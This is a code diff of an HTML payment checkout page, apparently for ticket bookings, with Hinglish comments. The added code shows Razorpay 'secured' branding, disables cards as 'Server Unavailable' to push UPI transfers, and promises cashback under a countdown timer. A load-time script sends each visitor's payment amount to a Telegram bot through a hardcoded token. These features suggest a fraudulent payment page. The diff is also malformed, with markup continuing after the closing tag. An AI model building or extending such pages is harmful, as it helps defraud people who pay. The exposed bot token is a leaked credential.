@@ -1,4 +1,4 @@
-<html lang="en">
+                     <html lang="en">
 
 <head>
     <meta charset="UTF-8">
@@ -13,12 +13,27 @@
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '1252040857081560');
+    fbq('track', 'PageView');
+    fbq('track', 'InitiateCheckout'); /* Ye bhi add kar diya taki payment page track ho sake */
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/></noscript>
     <style jsx="true">
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 
         body {
             font-family: 'Inter', sans-serif;
-            -webkit-tap-highlight-color: transparent; /* Mobile par click highlight hatane ke liye */
+            -webkit-tap-highlight-color: transparent;
         }
 
         .payment-option {
@@ -91,7 +106,6 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
         }
 
-        /* Mobile specific adjustments */
         @media (max-width: 480px) {
             .upi-id-container {
                 flex-direction: column;
@@ -103,7 +117,7 @@
                 text-align: center;
                 font-size: 0.9rem;
                 padding: 6px 0;
-                word-break: break-all; /* Lamba UPI ID tootne se bachaega */
+                word-break: break-all;
             }
             
             #qr-code-img {
@@ -193,6 +207,115 @@
                                                     <img alt="PhonePe" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/phonepe.svg">
                                                     <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">PhonePe</span>
                                                 </a>
+                                                <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
+                                                    <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
+                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
+                                                </a>
+                                            </div>
+                                            
+                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center">Waiting for payment confirmation...</p>
+
+                                            <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-lg p-3 sm:p-4 text-center mx-1 mt-4 mb-2 shadow-sm">
+                                                <p class="text-[10px] sm:text-xs text-[#166534] leading-relaxed">
+                                                    <i class="fas fa-tag mr-1 text-[#22c55e]"></i> <strong>Upto ₹2,503 cashback.</strong> You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.
+                                                </p>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="border-t border-gray-100 mx-4 py-4 flex justify-between items-center opacity-70 cursor-not-allowed">
+                                <div class="flex items-center gap-3">
+                                    <div class="text-[#8b5cf6] w-6 text-center">
+                                        <i class="fas fa-credit-card text-lg sm:text-xl"></i>
+                                    </div>
+                                    <span class="font-semibold text-gray-800 text-sm sm:text-base">Cards</span>
+                                </div>
+                                <span class="text-xs sm:text-sm font-semibold text-red-500">Server Unavailable</span>
+                            </div>
+                            
+                        </div>
+                        
+                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mt-6 payment-method-container">
+                            <div class="flex justify-between items-center p-4 sm:p-5 border-b border-gray-100">
+                                <div>
+                                    <div class="text-xs text-gray-500 font-medium mb-1">Amount to be Paid</div>
+                                    <div class="text-xl sm:text-2xl font-bold text-gray-900 final_paid_price">₹0</div>
+                                </div>
+                                <a href="#" class="text-xs sm:text-sm font-semibold text-blue-600 hover:underline">View Details</a>
+                            </div>
+
+                            <div class="p-4 sm:p-5 flex flex-col items-center bg-gray-50/50">
+                                <div class="flex items-center text-gray-500 text-[10px] uppercase font-semibold tracking-wider mb-2">
+                                    <i class="fas fa-lock mr-1.5 text-xs"></i> Secured by
+                                </div>
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Razorpay_logo.svg" alt="Razorpay" class="h-5 sm:h-6 mb-4 sm:mb-5">
+
+                                <div class="bg-white w-full rounded-xl p-3 flex items-start gap-2 border border-gray-100 mb-3 shadow-sm">
+                                    <i class="fas fa-shield-check text-green-600 mt-0.5 text-sm"></i>
+                                    <p class="text-[10px] sm:text-[11px] text-gray-600 leading-tight">Your payment information is secure and encrypted</p>
+                                </div>
+
+                                <a href="#" class="text-[10px] sm:text-[11px] text-blue-600 hover:underline">Payment Terms & Privacy Policy</a>
+                            </div>
+                        </div>
+
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            let timeLeft = 10 * 60; // 10 minutes in seconds
+            const timerEl = document.getElementById('countdown');
+            
+            if(timerEl) {
+                const countdownInterval = setInterval(() => {
+                    if(timeLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        timerEl.innerText = "0:00";
+                        return;
+                    }
+                    timeLeft--;
+                    let m = Math.floor(timeLeft / 60);
+                    let s = timeLeft % 60;
+                    timerEl.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                }, 1000);
+            }
+        });
+    </script>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+            const chatId = "6820660513";
+            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
+            
+            const message = `🚨 *New User on Payment Page!*\n\n💰 *Amount:* ₹${finalPrice}\n🌐 *Page:* Checkout/Payment`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Telegram Error:", err));
+        });
+    </script>
+
+    <script type="module" src="js/payment.js"></script>
+</body>
+</html>
+                        </a>
                                                 <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
                                                     <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
                                                     <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
